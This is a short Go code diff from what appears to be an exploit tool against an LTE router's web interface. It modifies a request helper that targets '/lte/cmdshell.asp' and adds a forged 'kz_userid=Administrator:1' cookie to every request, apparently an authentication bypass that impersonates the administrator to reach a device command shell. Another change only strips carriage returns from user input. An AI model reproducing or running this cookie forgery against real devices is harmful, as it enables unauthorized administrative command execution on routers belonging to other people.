@@ -58,6 +58,7 @@ func readUserLine(prompt string) *string{
 	fmt.Println(prompt)
 	line, err := reader.ReadString('\n')
 	line = strings.ReplaceAll(line , "\n","")
+	line = strings.ReplaceAll(line , "\r","")
 	if err != nil{
 		return nil
 	}
@@ -91,7 +92,8 @@ func makeRequest(path string,params string,cookies string)(response* string ,coo
 	req.Header.Add("Referer", fmt.Sprintf("http://%s/lte/cmdshell.asp",ip))
 	req.Header.Add("Accept-Language", "en-US,en;q=0.9,fa;q=0.8")
 	if cookies != "" {
-		req.Header.Add("Cookie", cookies)
+		cookies = strings.ReplaceAll(cookies,"path=/","")
+		req.Header.Add("Cookie", cookies + " kz_userid=Administrator:1;")
 	}
 
 	res, err := client.Do(req)
